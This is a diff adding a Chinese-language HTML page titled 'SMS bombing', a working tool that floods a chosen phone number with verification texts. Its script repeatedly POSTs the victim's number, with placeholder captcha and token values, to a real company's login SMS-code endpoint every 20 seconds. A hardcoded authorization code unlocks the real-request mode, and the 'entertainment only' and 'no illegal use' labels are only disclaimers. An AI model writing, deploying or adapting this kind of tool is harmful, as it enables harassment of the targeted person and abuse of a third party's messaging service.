@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>短信轰炸</title>
+<link href="https://cdn.jsdelivr.net/npm/normalize.css@8" rel="stylesheet"/>
+<style>
+:root{
+  --main:#f7a100;
+  --bg:#111;
+  --card:#2228;
+  --radius:16px;
+  --blur:12px;
+}
+body{
+  height:100vh;
+  margin:0;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,#1e1e2f 0%,#2a2a40 100%);
+  color:#eee;
+  font-family:system-ui,Arial,sans-serif;
+}
+.card{
+  width:360px;
+  padding:32px 28px;
+  border-radius:var(--radius);
+  background:var(--card);
+  backdrop-filter:blur(var(--blur));
+  box-shadow:0 8px 32px rgba(0,0,0,.5);
+  display:flex;
+  flex-direction:column;
+  gap:18px;
+  transition:transform .3s;
+}
+.card:hover{transform:translateY(-4px);}
+input[type=text],input[type=password],input[type=number]{
+  width:100%;
+  padding:10px 12px;
+  border:none;
+  border-radius:8px;
+  background:#fff1;
+  color:#ff3040;          /* 用户输入文字设为红色 */
+  outline:none;
+  transition:box-shadow .3s;
+}
+input:focus{box-shadow:0 0 0 2px var(--main);}
+button{
+  padding:10px 0;
+  border:none;
+  border-radius:8px;
+  background:var(--main);
+  color:#111;
+  font-weight:bold;
+  cursor:pointer;
+  transition:background .3s,transform .2s;
+}
+button:hover{background:#0ff;}
+button:active{transform:scale(.96);}
+.switch{position:relative;display:inline-block;width:46px;height:24px;}
+.switch input{opacity:0;width:0;height:0;}
+.slider{
+  position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;
+  background:#444;transition:.4s;border-radius:34px;
+}
+.slider:before{
+  position:absolute;content:"";height:18px;width:18px;left:3px;bottom:3px;
+  background:#fff;transition:.4s;border-radius:50%;
+}
+input:checked + .slider{background:var(--main);}
+input:checked + .slider:before{transform:translateX(22px);}
+#log{
+  max-height:120px;overflow-y:auto;
+  font-size:12px;font-family:monospace;
+  background:#0003;border-radius:8px;padding:8px;line-height:1.4;
+}
+.success{color:#0f0}.error{color:#f55}
+.fade-in{animation:fade .4s}@keyframes fade{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:0}}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2 style="text-align:center;margin:0">短信轰炸</h2>
+
+  <label>手机号
+    <input id="phone" type="text" maxlength="11" placeholder="仅数字" pattern="\d{11}">
+  </label>
+
+  <label style="display:flex;align-items:center;gap:8px">
+    <span>真实请求（强度不高仅娱乐）</span>
+    <label class="switch">
+      <input id="realToggle" type="checkbox">
+      <span class="slider"></span>
+    </label>
+  </label>
+
+  <div id="authRow" style="display:none">
+    <label>授权码"jz33486"
+      <input id="authCode" type="password" placeholder="请向管理员索取">
+    </label>
+  </div>
+
+  <button id="btnStart">开始（禁止违法犯罪）</button>
+  <button id="btnStop" disabled>停止</button>
+
+  <div id="log"></div>
+</div>
+
+<script>
+const url = 'https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code';
+const headers = {'Content-Type':'application/json'};
+let timer = null;
+
+const qs = id => document.getElementById(id);
+const log = (msg, cls='') => {
+  const div = qs('log');
+  div.insertAdjacentHTML('beforeend', `<div class="${cls} fade-in">${new Date().toLocaleTimeString()} ${msg}</div>`);
+  div.scrollTop = div.scrollHeight;
+};
+
+qs('realToggle').onchange = () => {
+  qs('authRow').style.display = qs('realToggle').checked ? 'block' : 'none';
+};
+
+qs('btnStart').onclick = () => {
+  const phone = qs('phone').value.trim();
+  if (!/^\d{11}$/.test(phone)) return alert('请输入 11 位手机号');
+  if (qs('realToggle').checked && qs('authCode').value.trim() !== 'jz33486') {
+    return alert('授权码错误！');
+  }
+
+  qs('btnStart').disabled = true;
+  qs('btnStop').disabled = false;
+
+  let count = 0;
+  const real = qs('realToggle').checked;
+  const payload = JSON.stringify({mobile: phone, captcha:'1111', token:'1111'});
+
+  const tick = async () => {
+    if (real) {
+      try {
+        const r = await fetch(url, {method:'POST', headers, body:payload});
+        log(`已发送 (${++count}) ${r.status}`, r.ok ? 'success' : 'error');
+      } catch (e) {
+        log(`发送失败 ${e.message}`, 'error');
+      }
+    } else {
+      log(`模拟成功 (${++count})`, 'success');
+    }
+  };
+
+  tick();                         // 立即一次
+  timer = setInterval(tick, 20000); // 每 20 秒一次 ≈ 每分钟 3 条
+};
+
+qs('btnStop').onclick = () => {
+  clearInterval(timer);
+  log('已停止');
+  qs('btnStart').disabled = false;
+  qs('btnStop').disabled = true;
+};
+</script>
+</body>
+</html>
